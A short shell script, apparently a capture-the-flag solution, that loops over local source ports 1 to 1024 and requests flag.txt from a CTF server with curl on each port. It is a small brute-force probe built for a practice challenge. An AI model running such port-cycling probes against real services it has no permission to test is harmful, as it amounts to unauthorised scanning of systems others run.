for i in $(seq 1 1024);
do
  echo "port $i"
  curl --local-port $i https://mics-ctf.com:8101/flag.txt
done
